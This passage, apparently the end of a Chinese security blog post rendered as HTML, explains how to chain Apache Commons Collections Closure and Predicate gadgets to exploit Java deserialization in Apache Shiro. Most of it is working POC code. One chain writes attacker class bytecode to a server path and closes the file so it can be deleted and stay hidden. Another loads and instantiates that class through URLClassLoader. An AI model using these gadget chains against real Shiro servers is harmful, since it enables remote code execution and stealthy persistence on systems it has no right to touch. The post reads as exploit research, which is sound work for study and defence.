+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;write&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{code}),
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Predicate predicate2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformedPredicate(
+</span></span><span style="display:flex;"><span>        (Transformer) InstantiateTransformerCon.<span style="color:#a6e22e">newInstance</span>(<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;/uploadpath/Test.class&#34;</span>}),
+</span></span><span style="display:flex;"><span>        predicate3
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Predicate predicate1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformedPredicate(
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> ConstantTransformer(FileOutputStream.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>        predicate2
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>上面的POC没有执行<code>close</code>方法，虽然后续可以正常加载字节码，但在windows系统上没办法删除，在Linux上也留着fd，不够隐蔽。</p>
+<p>如果要执行<code>close</code>方法的话执行流程就不是纯线性的了，不过好在<code>IfClosure</code>支持对同一个对象执行多条分支<code>Closure</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">execute</span>(Object input) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iPredicate.<span style="color:#a6e22e">evaluate</span>(input) <span style="color:#f92672">==</span> <span style="color:#66d9ef">true</span>) {
+</span></span><span style="display:flex;"><span>        iTrueClosure.<span style="color:#a6e22e">execute</span>(input);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        iFalseClosure.<span style="color:#a6e22e">execute</span>(input);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>可以先通过<code>InstantiateTransformer</code>获得一个<code>FileOutputStream</code>对象赋值为<code>input</code>变量，然后进入<code>IfClosure</code>通过<code>TransformedPredicate</code>的<code>evaluate</code>执行<code>write</code>方法，最后进入<code>else</code>分支通过<code>iFalseClosure</code>执行<code>close</code>方法。流程图如下：</p>
+<p><img alt="1" loading="lazy" src="/posts/commons-collections%E4%B8%ADclosure%E5%92%8Cpredicate%E5%9C%A8shiro%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/images/1.png"></p>
+<p><code>if</code>表达式里的<code>iPredicate</code>对应<code>predicate_main</code></p>
+<p>POC:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Class InstantiateTransformerClass <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;org.apache.commons.collections.functors.InstantiateTransformer&#34;</span>);
+</span></span><span style="display:flex;"><span>Constructor InstantiateTransformerCon <span style="color:#f92672">=</span> InstantiateTransformerClass.<span style="color:#a6e22e">getDeclaredConstructor</span>(<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Class<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>, Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>});
+</span></span><span style="display:flex;"><span>InstantiateTransformerCon.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Predicate predicate_main <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformedPredicate(
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;write&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{code}),
+</span></span><span style="display:flex;"><span>        FalsePredicate.<span style="color:#a6e22e">getInstance</span>()
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Closure branch_false_closure <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> IfClosure(
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> TransformedPredicate(
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;close&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{}), <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>        ), <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Predicate predicate3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformedPredicate(
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> ClosureTransformer(<span style="color:#66d9ef">new</span> IfClosure(predicate_main, <span style="color:#66d9ef">null</span>, branch_false_closure)),
+</span></span><span style="display:flex;"><span>        FalsePredicate.<span style="color:#a6e22e">getInstance</span>()
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Predicate predicate2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformedPredicate(
+</span></span><span style="display:flex;"><span>        (Transformer) InstantiateTransformerCon.<span style="color:#a6e22e">newInstance</span>(<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;/uploadpath/Test.class&#34;</span>}),
+</span></span><span style="display:flex;"><span>        predicate3
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Predicate predicate1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformedPredicate(
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> ConstantTransformer(FileOutputStream.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>        predicate2
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>本来想试试用<code>FileOutputStream</code>指定append参数为<code>true</code>，这样可以文件追加，但解析<code>boolean</code>类时会进入Shiro的<code>ClassResolvingObjectInputStream</code>类自定义的<code>resolveClass</code>方法，用的是<code>ClassUtils#forName</code>方法。</p>
+<p><img alt="2" loading="lazy" src="/posts/commons-collections%E4%B8%ADclosure%E5%92%8Cpredicate%E5%9C%A8shiro%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/images/2.png"></p>
+<p>然后会报错找不到这个类，跟上面说的无法解析非Java数组应该是类似的原因。</p>
+<p><img alt="3" loading="lazy" src="/posts/commons-collections%E4%B8%ADclosure%E5%92%8Cpredicate%E5%9C%A8shiro%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/images/3.png"></p>
+<p>而原生的<code>resolveClass</code>方法代码有一个专门的map存放这些类：</p>
+<p><img alt="4" loading="lazy" src="/posts/commons-collections%E4%B8%ADclosure%E5%92%8Cpredicate%E5%9C%A8shiro%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/images/4.png"></p>
+<p>所以<code>int.class</code>，<code>boolean.class</code>等都不能反序列化，这种情况下就没办法追加写入了。</p>
+<h2 id="加载类">加载类<a hidden class="anchor" aria-hidden="true" href="#加载类">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Class InstantiateTransformerClass <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;org.apache.commons.collections.functors.InstantiateTransformer&#34;</span>);
+</span></span><span style="display:flex;"><span>Constructor InstantiateTransformerCon <span style="color:#f92672">=</span> InstantiateTransformerClass.<span style="color:#a6e22e">getDeclaredConstructor</span>(<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Class<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>, Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>});
+</span></span><span style="display:flex;"><span>InstantiateTransformerCon.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Predicate predicate4 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformedPredicate(
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;newInstance&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{}),
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Predicate predicate3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformedPredicate(
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;loadClass&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;Test&#34;</span>}),
+</span></span><span style="display:flex;"><span>        predicate4
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Predicate predicate2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformedPredicate(
+</span></span><span style="display:flex;"><span>        (Transformer) InstantiateTransformerCon.<span style="color:#a6e22e">newInstance</span>(<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{URL<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">new</span> URL<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">&#34;file:///uploadpath/&#34;</span>)}}),
+</span></span><span style="display:flex;"><span>        predicate3
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Predicate predicate1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformedPredicate(
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> ConstantTransformer(URLClassLoader.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>        predicate2
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>通过不同的<code>Closure</code>配合可以执行复杂的操作，但这个方法有一个缺点，那就是<strong>参数不能变</strong>，<code>InvokeTransformer</code>和<code>InstantiateTransformer</code>中的<code>iArgs</code>都是<strong>提前设置</strong>的，所以像<code>defineClass</code>这种需要把<code>ClassLoader</code>对象作为参数的方法就不能执行了。</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://zoiltin.github.io/">zoiltin&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
